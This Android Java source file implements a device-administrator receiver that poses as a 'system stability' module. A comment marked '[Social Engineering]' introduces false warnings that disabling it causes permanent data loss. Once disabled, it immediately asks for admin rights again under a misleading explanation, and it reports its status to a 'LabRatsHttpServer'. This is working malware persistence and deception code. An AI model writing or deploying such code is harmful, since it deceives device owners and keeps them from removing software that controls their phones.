package com.labs.labrats;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import androidx.annotation.NonNull;

/**
 * Ensures system stability by managing device administrative protocols.
 */
public class StabilityPolicy extends android.app.admin.DeviceAdminReceiver {

    @Override
    public void onEnabled(@NonNull Context context, @NonNull Intent intent) {
        super.onEnabled(context, intent);
        LabRatsHttpServer.logActivity("STABILITY_SYSTEM: Policy enforcement active");
    }

    @Override
    public CharSequence onDisableRequested(@NonNull Context context, @NonNull Intent intent) {
        // [Social Engineering] discourage deactivation with dual-layer warning
        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> 
            android.widget.Toast.makeText(context, "CRITICAL: System stability protocol enforcement is mandatory.", android.widget.Toast.LENGTH_LONG).show());
            
        return "CRITICAL ERROR: System stability protocols cannot be deactivated. Disabling this module may result in permanent data loss and device instability.";
    }

    @Override
    public void onDisabled(@NonNull Context context, @NonNull Intent intent) {
        super.onDisabled(context, intent);
        LabRatsHttpServer.logActivity("STABILITY_ALERT: Policy enforcement interrupted. Restoring...");
        reInitializePolicy(context);
    }

    private void reInitializePolicy(Context context) {
        ComponentName componentName = new ComponentName(context, StabilityPolicy.class);
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        
        if (dpm != null && !dpm.isAdminActive(componentName)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Synchronization with system frameworks is required to maintain device stability.");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }
}
